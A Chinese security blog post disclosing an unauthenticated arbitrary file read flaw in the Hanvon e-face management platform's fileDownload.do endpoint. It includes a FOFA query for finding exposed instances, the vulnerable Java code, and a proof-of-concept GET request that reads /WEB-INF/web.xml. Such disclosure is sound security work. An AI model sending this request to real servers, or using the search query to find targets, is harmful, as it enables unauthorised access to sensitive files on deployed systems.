---
title: "汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-personnel-fileDownload-fileread.html
asset_dir: assets/汉王e脸通综合管理平台-filedownload.do-任意文件读取漏洞
---

# 汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/6 08:27
- 764浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

软件

信息安全

鉴权

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `fileDownload.do` 接口存在任意文件读取漏洞。攻击者可在无需认证的情况下，通过构造恶意请求访问 `fileDownload.do` 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

漏洞预警服务

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `PersonnelController` 下的 `fileDownload.do` 实现方式

```
@ResponseBody
    @RequestMapping(
        value = {"/fileDownload.do"},
        method = {RequestMethod.GET}
    )
    public void fileUpload(@RequestParam(required = true) String fileId, HttpServletResponse response) {
        try {
            if (fileId.equals("undefined")) {
                return;
            }

            File file = new File(TheApp.getRootPath(fileId));
            String[] split = fileId.split("/");
            String fileName = split[split.length - 1];
            response.setContentType("application/octet-stream;charset=utf-8");
            response.setHeader("Content-Disposition", "attachment;fileName=" + fileName);
            ServletOutputStream outputStream = response.getOutputStream();
            FileInputStream fileInputStream = new FileInputStream(file);
            loadFile(outputStream, fileInputStream);
            closeIO(outputStream, fileInputStream);
        } catch (IOException e) {
            String msg = getMessage("basics_go_wrong") + e.getMessage();
            logger.error(msg);
        }

    }
```

深入探索

编程语言教程

传输层安全性协议

云安全解决方案

跟进 `TheApp.getRootPath` 方法

```
public static String getRootPath(String path) {
    StringBuilder rootPath = new StringBuilder(webPath);
    rootPath.append(File.separator).append(path);
    return rootPath.toString();
}
```

对用户可控参数 `fileId` 无任何过滤或校验，直接拼接路径返回文件路径进行文件操作，也是朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞](images/img-001-6e5fc379f424.webp)](https://image.mrxn.net/31eecc4410174d7d82c49c0219c6f532.webp)

成功读取到 `web.xml` 文件

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
